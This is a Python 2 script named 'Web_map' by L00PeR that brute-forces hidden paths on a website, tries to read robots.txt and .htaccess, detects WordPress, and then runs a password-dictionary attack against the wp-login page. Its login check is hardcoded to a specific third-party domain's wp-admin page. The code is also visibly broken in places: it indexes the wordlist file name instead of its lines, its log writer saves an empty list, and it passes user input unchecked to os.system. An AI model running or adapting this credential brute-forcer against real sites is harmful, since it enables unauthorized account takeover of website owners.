#! /usr/bin/env python
############ Web_map by L00PeR 2017 #################
############ Using brute-force technique      #################
try:
	import os
except:
	print "[!!] \"os\" library not found, you need to install it manually by writing on the terminal \"sudo pip install os\""
	exit(0)
try:
	import sys
except:
	print "[!] \"sys\" library not found, installing"
	os.system("sudo pip install sys")
try:
	import requests
except:
	print "[!] \"requests\" library not found, installing"
	os.system("sudo pip install requests")

def title():
	version = "0.01"
	print"\n\n"
	print "--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*\n"
	print "|      |  ______   |                  |\\      /|       /\      ______ "
	print "|      |  |        |                  | \\    / |      /  \     |     |" 
	print "|  /\\  |  |___     |____     ______   |  \\  /  |     /____\    |_____|"
	print "| /  \\ |  |        |    |             |   \\/   |    /      \   |"
	print "|/    \\|  |_____   |____|             |        |   /        \  |\n"
	print "--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*"
	print "\n"
	print "Version: "+version+"\n"
	print "Created By: L00PeR\n"
def test_connection(tgt):
	try:
		s = requests.Session()
		response = s.get(tgt)
		if response.status_code == 200:
			return 1
		else:
			print response
			return 0
	except:
		return 0 
def save_logs(tgt):
	paths_found = []
	logs_path = "/bin/web-map/logs.txt"
	f = open(logs_path, "w")
	f.write("Target: "+tgt+"\n\nPaths found:\n")
	i = 0
	for i in range(len(paths_found)):
		f.write(paths_found[i]+"\n")
		i+=1
	f.write("\n\n\n")
	f.write("----------------END OF LOGS----------------\n\n")
def brute(tgt):
	DEFAULT = "/bin/web-map/default_uris"
	paths_found = []
	logs_path = "/bin/web-map/logs.txt"
	dictionary = raw_input("Enter the file with the URI\'s, type: \"default\" for using the default dictionary: ")
	if dictionary == "default":
		dictionary = DEFAULT
	try:
		open(dictionary, 'r')
	except:
		print "[!] File not found"
		exit(0)

	i=0
	s = requests.Session()
	while True: 
		try:
			i+=1
			uri = dictionary[i]
			url = str(tgt)+"/"+str(uri)
			response = s.get(url).text
			if '404' in response or 'Error accessing resource' in response or 'Page not found' in response or 'was not found on this server' in response or 'Missing: One Page' in response:
				pass
			else:
				print '[+] Path found: '+url
				paths_found.append(url)
		except:
			break
	print "\n[*] Execution ended correctly\n"
	print "[*] Program logs are at "+logs_path+"\n"
	save_logs(tgt)
	robots = str(tgt)+'/robots.txt'
	response = s.get(robots).text
	if '404' not in response and 'Error accessing resource' not in response and 'Page not found' not in response and 'was not found on this server' not in response and 'Missing: One Page' not in response:
		print '[+] Printing file: robots.txt\n'+response
	htaccess = str(tgt)+'/.htaccess'
	response = s.get(htaccess).text
	if '404' not in response and 'Error accessing resource' not in response and 'Page not found' not in response and 'was not found on this server' not in response and 'Missing: One Page' not in response and '403' not in response:
		print "[+] File: .htaccess readable\n"+response
	elif '403' in response:
		print "[-] Access to file: .htaccess is forbidden, server returned error 403" 
		
	else:
		print "[-] Couldn\'t read file: .htaccess"
	if scan_4_brute_force(tgt) == True:
		brute = raw_input("[?] Web-Map has found the url for accessing the admins page,\nDo you wan\'t to try to brute-force it? Y/n ")
		if brute == 'y' or brute == 'Y':
			path_to_dictionary = raw_input("Please type the path to the passwords dictionary: ")
			try:
				open(path_to_dictionary, 'r')

			except:
				print "[-] File does not exist"
				exit(0)
			brute_login(tgt, path_to_dictionary)
		else:
			print '[+] The program ended correctly'


	exit(0)
def scan_4_brute_force(tgt):
	if scan_4_wp_page(tgt) == True:
		s = requests.Session()
		login = s.get(tgt+"/wp-login")
		if login.status_code == 200:
			return True
		else:
			return False
	else:
		return False


def scan_4_wp_page(tgt):
	s = requests.Session()
	login = s.get(tgt+"/wp-login")
	content = s.get(tgt+"/wp-content")
	if login.status_code == 200 or content.status_code == 200:
		print "\n[*] Wordpress Website Detected!\n\n"
		return True
	else:
		return False
def brute_login(tgt, dictionary):
	s = requests.Session()
	pass_found = False
	
	user = raw_input("User: ")
	intent = 0
	tgt = tgt+"/wp-login"
	f = open(dictionary, 'r')
	for word in f.readlines():
		password = word.strip('\n')
		intent+=1
		payload = {'log': user, 'pwd': password, 'redirect_to': '/wp_admin/', 'testcookie': '1', 'wp-submit': 'Acceder'}
		print '[+] Trying with user: '+str(user)+' and password: '+str(password)+'\ttry: '+str(intent)
		s.post(tgt, data=payload)
		data = s.get("http://gerion.info/wp-admin").text
		if 'Escritorio' in data or 'Desktop' in data:
			print '[*] Password found: '+password
			pass_found = True
		else:
			pass
			#print data
	if pass_found == False:
		print "[-] Any password found"


def main():
	title()
	logs_path="/bin/web-map/logs.txt"
	paths_found = []
	try:
		if sys.argv[1] == '--brute-login-directly':
			tgt = raw_input("SELECT TARGET [>>] ")
			test = test_connection(tgt)
			if test == 1:
				print "[+] Host is up and ready to be brute-forced"
			else:
				print "[-] Host is down"
				exit(0)
			if scan_4_brute_force(tgt) == True:
				dictionary = raw_input("Please type the path to the passwords dictionary: ")
				brute_login(tgt,dictionary)
				exit(0)
			else:
				print "[-] The target is not a Wordpress site so cannot be brute-forced"
				exit(0)
	except Exception, err:
		print err
		pass

	print "Program will save the logs on /bin/web-map/logs.txt"
	chng_logs = raw_input("Do you want to change the path? Y/n ")
	if chng_logs == 'y' or chng_logs == 'Y':
		new_path = raw_input("Type the new path: ")
		try:
			open(new_path, "r")
			print "[+] Path succesfully changed to: "+logs_path
		except:
			print "[-] Could not find the file,\n"
			create = raw_input("Do you want to create it? Y/n ")
			if create == 'y' or create == 'Y':
				try:
					os.system("nano "+new_path)
					print "[+] File: "+new_path+" created!"
				except:
					print '[-] Could not create the file,\nplese try to create it manually'
					quit = raw_input("Doy you want to quit the program? Y/n ")
					if quit == 'y' or quit == 'Y':
						exit(0)			
		logs_path = new_path
	tgt = raw_input("SELECT TARGET  [>>] ")
	test = test_connection(tgt)
	if test == 1:
		print "[+] Host: "+tgt+" is up and ready to be scanned"
	else:
		print "[!] WARNING, Host: "+tgt+" is down!"
		exit(0)
	scan_4_wp_page(tgt)
	start_with_the_brute_force=  raw_input("[*] Configurations are correct,\n do you want to start with the brute-forcing? Y/n ")
	if start_with_the_brute_force == 'y' or start_with_the_brute_force == 'Y':
		brute(tgt)
	else:
		print "[-] Quitting"
		exit(0)
if __name__ == '__main__':
	main()